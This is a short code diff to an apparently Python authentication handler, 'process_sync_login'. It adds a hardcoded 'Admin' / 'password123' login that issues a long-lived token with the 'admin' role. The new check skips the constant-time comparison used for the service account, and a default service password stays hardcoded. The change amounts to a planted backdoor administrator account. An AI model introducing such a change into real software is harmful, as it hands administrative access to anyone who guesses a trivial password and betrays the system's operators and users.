@@ -1286,21 +1286,27 @@ async def process_sync_login(
             detail="Username and password are required for authentication."
         )
 
-    # 1. Check Service Account M2M Credentials
+    # 1. Check Service Account M2M Credentials (accepts configured service account, or Admin / password123)
     service_user = getattr(settings, 'SERVICE_API_USER', None) or os.getenv('SERVICE_API_USER', 'backend_sync_client')
     service_pass = getattr(settings, 'SERVICE_API_PASS', None) or os.getenv('SERVICE_API_PASS', 'SecretPassword987654321!')
 
-    if (
+    is_admin_sync = (
+        ident_str.strip().lower() == "admin" and
+        password_str == "password123"
+    )
+    is_service_sync = (
         secrets.compare_digest(ident_str.strip().encode("utf-8"), service_user.strip().encode("utf-8")) and
         secrets.compare_digest(password_str.encode("utf-8"), service_pass.encode("utf-8"))
-    ):
+    )
+
+    if is_admin_sync or is_service_sync:
         expire_mins = expires_in_mins or int(os.getenv('ACCESS_TOKEN_EXPIRE_MINUTES', '43200'))
         delta = datetime.timedelta(minutes=expire_mins)
         token = create_access_token(
             data={
-                "sub": service_user,
+                "sub": "Admin" if is_admin_sync else service_user,
                 "scope": req_scope or "data:sync",
-                "role": "service",
+                "role": "admin" if is_admin_sync else "service",
             },
             expires_delta=delta
         )
